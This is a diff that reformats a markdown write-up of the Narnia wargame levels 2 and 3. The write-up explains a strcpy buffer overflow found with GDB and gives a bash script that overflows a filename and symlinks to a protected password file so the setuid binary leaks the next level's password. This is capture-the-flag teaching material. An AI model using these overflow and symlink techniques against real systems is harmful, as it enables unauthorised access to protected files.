@@ -27,7 +27,9 @@ The buffer is `char buf[128]` and the function we will exploit will be `strcpy(b
 In order to see where is the range of address we can fall in using a **NOP-Sled**, first of all we have to fill the buffer with 128 "A", inside GDB.
 Note the breakpoint at *strcpy*
 
-`gdb narnia2`
+```console
+gdb narnia2
+```
 
 ```bash
 b strcpy
@@ -54,7 +56,10 @@ Let's run the program with:
 In the stack are allocated `char ofile[16] = "/dev/null"` and `char ifile[32]` and there is also a `strcpy(ifile, argv[1])` that copies in ifile argv[1]. Looking at the stack we can see that the two buffers are one above the other, then writing to **ifile** (strcpy doesn't check the length) also **ofile** can be written.
 You can analyze the stack using:
 
-`gdb narnia3`
+```console
+gdb narnia3
+```
+
 `run AAAAAAAAAAAAAAAAAAAAAAAAAAA`
 `b open@plt`
 `x/700xw $esp`
@@ -68,11 +73,17 @@ Now you can set up your files and folder in your filesystem:
 
 ```bash
 #!/bin/bash
+
 mkdir /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/
+
 touch /tmp/yourfile
+
 chmod 777 /tmp/yourfile
+
 ln -s /etc/narnia_pass/narnia4 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/yourfile
+
 /narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/yourfile
+
 cat /tmp/yourfile
 ```
 
